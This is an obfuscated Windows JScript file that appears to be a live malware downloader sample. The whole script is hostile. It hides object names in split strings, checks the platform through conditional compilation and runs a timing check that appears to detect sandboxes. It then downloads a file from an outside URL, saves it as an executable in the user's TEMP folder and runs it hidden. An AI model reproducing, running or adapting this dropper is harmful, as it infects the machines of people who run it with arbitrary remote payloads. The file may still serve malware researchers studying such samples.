var NN = false;
var W = "Create"+"Object";
var MC = function ZN() {return WScript[W]("WScript"+".Shell");}(), ZG = 11;
var AU = "MSXML2"+".XMLHTTP";
var NH = 2;
var CC = NH - 2;
function SF(QI){MC["Run"](QI, CC, CC);};
function TF(){return AU + "";};
function LT(O, OU){CC = CC * 1; return O - OU;};
function J(){return W;};
/*@cc_on
  @if (@_win32 || @_win64)
    NN = true;
  @end
@*/
if (NN)
{
var E = "";
function ZP(){return 22;};
var KE = 0; var P = 0;
function K()
{
var QQ = new this["Date"]();
var FX = QQ["getUTCMilliseconds"]();
WScript["Sleep"](ZP());
var QQ = new this["Date"]();
var WO = QQ["getUTCMilliseconds"]();
WScript["Sleep"](ZP());
var QQ = new this["Date"]();
var U = QQ["getUTCMilliseconds"]();
var KE = "PR";
KE = LT(WO, FX);
var P = "W0";
P = LT(U, WO);
E = "open";
return LT(KE, P);
}
var Q = false;
var FK = false;
for (var BE = CC; BE < ZP() * 1; BE++){if (K() != CC){
Q = true; 
P = "31" + 11 * KE + P; 
FK = true; 
break;
}}
function IH() {return ((Q == true) && (Q == FK)) ? 1 : CC;};
if (Q && IH() && FK){
function WW() {return MC["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "m7bPhNTifsR.ex" + "e";};
 UN = TF();
 CB = WScript[W](UN);
 var E0 = 1;
do { 
	for (;E0;){
	try {
		if (E0 == 1)
		{
			CB[E]("GET", "http://ekotrade.pl/m4ujda", false);
			CB["send"]();
			BH = "Sleep";
			E0 = 2;
		}
		WScript[BH](ZP() + 120); 
		if (CB["readystate"] < 2 * 2) continue;
		E0 = CC;
		function UL(X) {var RP = (1, 2, 3, 4, 5, X); return RP;};
		XN = WScript[J()]("ADODB.Stream");
		UN = XN;
		UN[E]();
		UN["type"] = UL(1);
		UN["write"](CB["ResponseBody"]);
		XN["position"] = UL(CC);
		UN["Save" + "ToFile"](WW(), 2);
		XN["cl"+"ose"]();
		J0 = WW();
		SF(J0);
	} catch(G){};};
}while (E0);
}
}

